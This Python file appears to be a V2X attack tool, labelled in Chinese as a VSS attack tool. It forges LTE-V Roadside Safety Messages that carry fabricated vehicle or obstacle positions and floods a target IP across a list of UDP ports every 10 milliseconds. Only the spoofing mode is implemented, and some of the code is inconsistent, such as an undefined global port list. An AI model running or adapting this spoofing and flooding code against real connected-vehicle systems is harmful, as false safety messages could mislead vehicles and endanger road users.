import threading
import math
import os
import socket
import asn1tools
from message.MsgFrame import RSM_MsgFrame
from message import RSM
import argparse
import time

def build_attack_message():
    dir = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))
    asnPath = os.path.join(dir, 'message', 'asn', 'LTEV.asn')
    ltevCoder = asn1tools.compile_files(asnPath, 'uper', numeric_enums=True)
    add_noise_y = 0
    add_noise_x = 0
    rsm_message = RSM_MsgFrame()
    id = str(10086)
    rsm_message['id'] = '{:0>8}'.format(id)

    earth_radius = 6371004
    lat = add_noise_y * 180.0 / (math.pi * earth_radius) + 39.5427
    longi = (add_noise_x * 180.0 / (math.pi * earth_radius)) / math.cos(lat * math.pi / 180.0) + (116.2317)

    rsm_message['refPos']['lat'] = int(1e7 * lat)
    rsm_message['refPos']['long'] = int(1e7 * longi)
    rsm_message['refPos']['elevation'] = 0

    objets = [{}]
    objets[0]['id'] = 10086
    objets[0]['position'] = (2000, 2000, 0)
    objets[0]["orientation"] = (0, 0, 0)
    objets[0]["speed"] = 0
    for i in range(len(objets)):
        participant =  RSM.RSMParticipantData_DF()
        x, y ,z = objets[i]["position"]
        yaw, pitch, roll = objets[i]["orientation"]

        lat = y * 180.0 / (math.pi * earth_radius) + 39.5427
        longi = (x * 180.0 / (math.pi * earth_radius)) / math.cos(lat * math.pi / 180.0) + (116.2317)

        id = str(objets[i]['id'])
        participant['id'] = '{:0>8}'.format(id)
        participant['pos']['offsetLL'] = ('position-LatLon', {'lon': int(1e7 * longi), 'lat': int(1e7 * lat)})
        participant['pos']['offsetV'] = ('elevation', int(100 * z))

        if yaw < 0:
            yaw += 360
        if yaw> 359.9875:
            yaw =359.9875 
        participant['speed'] = int(objets[i]["speed"] * 50)
        participant['heading'] = int(yaw * 80)
        rsm_message['participants'].append(participant)

    # logger.info(f"车辆 {v2x_manager.id} 发送消息: {rsm_message}")
    rsm_encoded = ltevCoder.encode('RoadsideSafetyMessage', RSM.PrepareForCode(rsm_message), check_constraints=True)
    AID = int(2).to_bytes(length=4, byteorder='big')
    rsm_encoded = AID + rsm_encoded
    rsm_encoded_str = rsm_encoded.hex()
    return rsm_encoded_str.encode('utf-8')


def build_fake_message():
    dir = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))
    asnPath = os.path.join(dir, 'message', 'asn', 'LTEV.asn')
    ltevCoder = asn1tools.compile_files(asnPath, 'uper', numeric_enums=True)
    add_noise_y = 0
    add_noise_x = 0
    rsm_message = RSM_MsgFrame()
    id = str(0)
    rsm_message['id'] = '{:0>8}'.format(id)

    earth_radius = 6371004
    lat = add_noise_y * 180.0 / (math.pi * earth_radius) + 39.5427
    longi = (add_noise_x * 180.0 / (math.pi * earth_radius)) / math.cos(lat * math.pi / 180.0) + (116.2317)

    rsm_message['refPos']['lat'] = int(1e7 * lat)
    rsm_message['refPos']['long'] = int(1e7 * longi)
    rsm_message['refPos']['elevation'] = 0

    objets = []
    for i in range(0, 16):
        item = {}
        item['id'] = 100 + i
        import random
        item['position'] = (119, random.randint(-10, 0), 0)
        print(item['position'])
        item["orientation"] = (0, 0, 0)
        item["speed"] = 0
        objets.append(item)
    for i in range(len(objets)):
        participant =  RSM.RSMParticipantData_DF()
        x, y ,z = objets[i]["position"]
        yaw, pitch, roll = objets[i]["orientation"]

        lat = y * 180.0 / (math.pi * earth_radius) + 39.5427
        longi = (x * 180.0 / (math.pi * earth_radius)) / math.cos(lat * math.pi / 180.0) + (116.2317)

        id = str(objets[i]['id'])
        participant['id'] = '{:0>8}'.format(id)
        participant['pos']['offsetLL'] = ('position-LatLon', {'lon': int(1e7 * longi), 'lat': int(1e7 * lat)})
        participant['pos']['offsetV'] = ('elevation', int(100 * z))

        if yaw < 0:
            yaw += 360
        if yaw> 359.9875:
            yaw =359.9875 
        participant['speed'] = int(objets[i]["speed"] * 50)
        participant['heading'] = int(yaw * 80)
        rsm_message['participants'].append(participant)

    # logger.info(f"车辆 {v2x_manager.id} 发送消息: {rsm_message}")
    rsm_encoded = ltevCoder.encode('RoadsideSafetyMessage', RSM.PrepareForCode(rsm_message), check_constraints=True)
    AID = int(2).to_bytes(length=4, byteorder='big')
    rsm_encoded = AID + rsm_encoded
    rsm_encoded_str = rsm_encoded.hex()
    return rsm_encoded_str.encode('utf-8')

def send_packet(udp_socket, attack_message, attack_address):
    try:
        udp_socket.sendto(attack_message, attack_address)
        print(f'Sent {attack_message} to {attack_address}')
    except Exception as e:
        print(f'Error sending packet to {attack_address}: {e}')

def spoofing(target, ports):
    target_ip = target
    ip_tables = open_ports

    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    add_noise_x, add_noise_y, add_noise_yaw = 0, 0, 0  # 假设这些值不变

    with open('ip_table', 'r') as f:
        for line in f:
            port = line.strip()
            ip_tables.append(int(port))

    
        attack_message = build_attack_message()
        while(True):
            for port in ip_tables:
                attack_address = (target_ip, port)
                send_packet(udp_socket, attack_message, attack_address)
            time.sleep(0.01)

def udp_port_scanner(target_ip='', start_port=1024, end_port=65532):
    open_ports = []
    recv_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    recv_socket.bind(('', 10086))
    port_tables, _ = recv_socket.recvfrom(4096)
    port_tables_str = port_tables.decode('utf-8')
    ports = port_tables_str.strip().split(',')
    for port in ports:
        open_ports.append(int(port))
    print(open_ports)
    return open_ports
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="VSS攻击工具")
    parser.add_argument('--name', type=str, help='攻击方式如:ddos, replay, spoofing', required=True)
    parser.add_argument('--target', type=str, help='攻击目标ip', required=True)
    # 解析命令行参数
    args = parser.parse_args()
    open_ports = udp_port_scanner(args.target)
    if args.name == 'spoofing':
        spoofing(target=args.target, ports=open_ports)
    elif args.name == 'replay':
        print('replay is not implemented')
